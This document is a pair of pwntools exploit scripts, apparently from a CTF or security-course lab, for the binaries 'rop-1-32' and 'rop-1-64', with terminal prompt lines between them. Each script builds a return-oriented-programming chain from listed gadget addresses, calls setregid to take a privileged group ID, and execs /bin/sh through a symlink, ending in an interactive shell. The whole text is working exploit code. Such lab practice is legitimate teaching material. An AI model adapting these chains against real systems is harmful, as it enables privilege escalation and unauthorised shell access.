#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-1-32")

buf = "A" * 0x88 + "BBBB"


"""
0x080483c0  execve@plt
0x080483d0  prctl@plt
0x080483e0  setregid@plt
"""

execve = p32(0x80483c0)
setregid = p32(0x80483e0)

# setregid(50000, 50000)

"""
0x0804865b : pop ebp ; ret
0x08048658 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804836d : pop ebx ; ret
0x080485f6 : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x0804865a : pop edi ; pop ebp ; ret
0x08048659 : pop esi ; pop edi ; pop ebp ; ret
"""

pop_pop_ret = p32(0x0804865a)

buf += setregid
buf += pop_pop_ret
buf += p32(50000)
buf += p32(50000)

string = p32(0x80485aa)

if os.path.exists("\x01"):
    os.unlink("\x01")

os.symlink("/bin/sh","\x01");

buf += execve
buf += p32(0)
buf += string
buf += p32(0)
buf += p32(0)

with open("exploit.txt", "wb") as f:
    f.write(buf)

p.sendline(buf)
p.interactive()

siscor@blue9057-vm-ctf2 : ~/week5
$ 

siscor@blue9057-vm-ctf2 : ~/week5
$ cat rop-1-64/exploit.py 
#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-1-64")

"""
0x0000000000400560  execve@plt
0x0000000000400570  prctl@plt
0x0000000000400580  setregid@plt
"""

execve = p64(0x400560)
setregid = p64(0x400580)

"""
0x00000000004007e3 : pop rdi ; ret
0x00000000004006d8 : pop rdx ; nop ; pop rbp ; ret
0x00000000004007e1 : pop rsi ; pop r15 ; ret
"""

pop_rdi_ret = p64(0x4007e3)
pop_rdx_nop_pop_rbp_ret = p64(0x4006d8)
pop_rsi_r15_ret = p64(0x4007e1)

buf = "A" * 0x80 + "A" * 8

# setregid(50001, 50001)
buf += pop_rdi_ret
buf += p64(50001)
buf += pop_rsi_r15_ret
buf += p64(50001)
buf += p64(50001)
buf += setregid

# execve(string, 0, 0)
string = p64(0x400740)
if os.path.exists("\x40"):
    os.unlink("\x40")

os.symlink("/bin/sh","\x40");

buf += pop_rdi_ret
buf += string
buf += pop_rsi_r15_ret
buf += p64(0)
buf += p64(0)
buf += pop_rdx_nop_pop_rbp_ret
buf += p64(0)
buf += p64(0)
buf += execve

p.sendline(buf)
p.interactive()
